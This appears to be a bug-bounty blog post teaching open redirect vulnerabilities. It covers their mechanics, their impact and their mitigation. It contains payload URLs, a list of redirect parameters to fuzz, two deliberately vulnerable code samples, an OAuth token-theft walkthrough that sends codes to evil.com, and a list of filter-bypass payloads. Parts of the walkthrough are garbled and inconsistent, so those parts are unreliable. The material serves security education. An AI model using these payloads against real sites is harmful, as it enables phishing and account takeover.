## Open Redirects: Fun to Find

Open redirects are fun to find. Most Bug Bounty programs don't pay more than $250 per each but I still love finding them. I have found around 500 open redirects in my life. I don't look for them so much anymore, but still think it's a must-look for a beginner or someone that wants to earn a few easy dollars.

I would recommend looking for them, not permanently, but still look at them if you find a missing `url` parameter in your target - you can also look for XSS in that situation!

### **Open Redirect: What Is It?**

Open redirect vulnerabilities, also known as unvalidated redirects and forwards, are a sneaky security flaw that can trick users into visiting malicious websites. Imagine a trusted friend giving you directions to a safe destination, but secretly leading you into a trap. That's the essence of an open redirect.

### **Understanding Open Redirects: The Basics**

Open redirects occur when a web application takes a user-supplied input and uses it to redirect the user to another URL without proper validation or sanitization. This allows attackers to craft malicious links that appear to come from a trusted source, but actually lead to phishing sites, malware downloads, or other harmful destinations.

### **The Anatomy of an Open Redirect**

1. **User Input:** The attacker provides a malicious URL as input to the web application. This could be through a parameter in a URL, a hidden form field, or even a cookie.
2. **Unvalidated Redirect:** The web application blindly redirects the user to the attacker-supplied URL without checking if it's legitimate.
3. **User Deception:** The user clicks on the malicious link, believing it to be safe because it appears to come from a trusted source.
4. **Malicious Action:** The user is redirected to the attacker's website, where they may be tricked into revealing sensitive information, downloading malware, or performing other harmful actions.

### **Types of Open Redirects**

- **Reflected Open Redirects:** The malicious URL is reflected back to the user in the HTTP response. This is often seen in error messages or other dynamic content.
- **Stored Open Redirects:** The malicious URL is stored on the server and used to redirect users in the future. This can happen in user profiles, comments, or other stored data.

### **Impact of Open Redirects**

Open redirects can be used to facilitate a variety of attacks, including:

- **Phishing Attacks:** Attackers can create convincing phishing pages that appear to be from legitimate websites.
- **Malware Distribution:** Attackers can trick users into downloading malware by disguising it as a legitimate download from a trusted site.
- **Session Hijacking:** Attackers can steal a user's session cookie by redirecting them to a malicious website that captures the cookie.
- **Denial of Service (DoS):** Attackers can redirect users to a website that is designed to overload the server and cause a DoS attack.

### **Identifying and Exploiting Open Redirects**

1. **Manual Testing:**
   - Look for parameters in URLs, forms, or cookies that are used to redirect users.
   - Try injecting different URLs to see if the application redirects you to them.
   - Look for ways to bypass filters and WAFs (Web Application Firewalls).

2. **Automated Scanning:**
   - Use web vulnerability scanners like Burp Suite to automate the process of finding open redirects.

### **Example Payloads:**

- `https://vulnerable-website.com/redirect?url=https://malicious-website.com`
- `https://vulnerable-website.com/profile?redirect_uri=https://malicious-website.com`

### **Mitigating Open Redirects**

- **Whitelist Valid URLs:** Only allow redirects to a pre-approved list of safe URLs.
- **Validate User Input:** Sanitize and validate all user-supplied input that is used for redirects.
- **Use Referrer Checks:** Verify that the referrer header matches the expected domain.
- **Warn Users:** Display a warning message before redirecting users to external websites.

---

## Open Redirect: A Real Bug Hunter's Experience

I'll try to cover all of the information I know regarding open redirects. I just found an open redirect on a private program, which I was able to use to access the victim's account. With the help of this essay, I thought I'd let the community know that an open redirect isn't the only method to send a victim to a phishing website.

### **Where is Open Redirect Located?**

The following are some potential open redirect parameters (you can use them to FUZZ, Google Dork, or do a manual search):

- `?redirect_url=`
- `?next=`
- `?continue=`
- `?goto=`
- `?return_Url=`
- `?destination=`
- `?fromURI=`
- `?redirect=`
- `?go=`
- `?from=`
- `?return=`
- `?rurl=`
- `?checkout_url=`

### **Vulnerable Code #1:**

```php
<?php
$redirect_url = $_GET['url'];
echo "I'm a dummy page";
header("Location: " . $redirect_url);
?>
```
In this instance, the user gets redirected to the value of the `url` argument by passing the parameter `url` straight to the header `Location`. The server reroutes the user to the URL supplied by the `url` argument if you insert `//evil.com` to the parameter.

### **An example of an account takeover is:**

If your target is configured for OAuth, the URL may appear as follows once a user authenticates with their credentials:

`https://vulnerable.com/v1/oauth/authorize?response_type=code&client_id=CLIENT_ID`

Where the user is redirected by the service following the issuance of an authorization code (`redirect_uri=CALLBACK_URL`).

`return_uri=` handles the final destination with the token when authenticating using OAuth. As the site in the example above will return to `https://www.vulnerable.com/callback` with a `?code=`, defined in `response_type=code`, you will be able to leak the token if you can **redirect the user to a website under your control**. `*.theirdomain.com/*` is typically whitelisted in OAuth configurations. By leveraging the open redirect we previously discovered, we can get around this. (The process is the same, but the settings could change.)

---

### **Using Open Redirect Abusively to Obtain Access Tokens:**

1. The user can be forwarded to the following URL:  
   `https://vulnerable.com/v1/oauth/authorize?client_id=CLIENT_ID&redirect_uri=`.  
   This URL redirects to `https://www.vulnerable.com/evil.com`. As `example.com` is on the whitelist, this will be accepted as `redirect_uri`.

2. The token will be produced after the user authenticates.

3. After being sent to `https://www.example.com/redirect?url=//evil.com?code=secret`, the web application.

4. The online application points to `//evil.com/secret` when redirected.

5. You may now use the code to access the victim's account as you have the code parameter on your server.

---

### **Abuse of Open Redirect for SSRF Filter Circumvention:**

One common method of getting around filters is to employ open redirect. Let's say that a certain domain may redirect to any location, but your service is permitted to get material from it. After accessing the authorized server, an attacker is free to travel wherever they choose.

---

### **Vulnerable Code #2**

```html
<html>
<script>
     let url = new URL(window.location);
     let searchParams = new URLSearchParams(url.search); 
     c = searchParams.get('url');
     top.location.href = c;
</script>
<h1>Demo Open Redirect to XSS</h1>
</html>
```

As the URL is supplied through a `url` parameter and is not sanitized when used inside a script element, it is possible to insert malicious code into the `url` parameter and execute it to obtain cross-site scripting (XSS).

### **Avoidances:**

Processing invalid user inputs is the most frequent reason for open redirection, especially when it comes to URL query strings. Avoid using user-controllable data in URLs wherever possible, and when you must use it, thoroughly clean it to lessen the likelihood of unwanted redirects. It is a good idea to whitelist all allowed target locations and reroute all other values to the default destination. Another choice is to generate a distinct ID for every redirect target, doing away with the user-controllable names of the URL.

By limiting referrer URL exposure with an appropriate `Referrer-Policy` header, you can further reduce the likelihood of token leaks.

---

### **Common Routes Around:**
# URLs

Here is a list of URLs:

1. \/yoururl.com
2. \/\/yoururl.com
3. \\yoururl.com
4. //yoururl.com
5. //theirsite@yoursite.com
6. /\/yoursite.com
7. [https://yoursite.com%3F.theirsite.com/](https://yoursite.com%3F.theirsite.com/)
8. [https://yoursite.com%2523.theirsite.com/](https://yoursite.com%2523.theirsite.com/)
9. [https://yoursite?c=.theirsite.com/](https://yoursite?c=.theirsite.com/)
10. [https://yoursite.com#.theirsite.com/](https://yoursite.com#.theirsite.com/)
11. [https://yoursite.com\.thersite.com/](https://yoursite.com\.thersite.com/)
12. // %2F/yoursite.com
13. ////yoursite.com
14. [https://theirsite.computer/](https://theirsite.computer/)




---

### **My Open Redirect Report was Closed as Not Applicable/Informative, Why?**

Not always being able to send a user to a different domain will qualify as a vulnerability until you can make it worse enough to demonstrate a significant effect on the target.

This is a cool public report that you can learn from - [https://hackerone.com/reports/469803](https://hackerone.com/reports/469803)
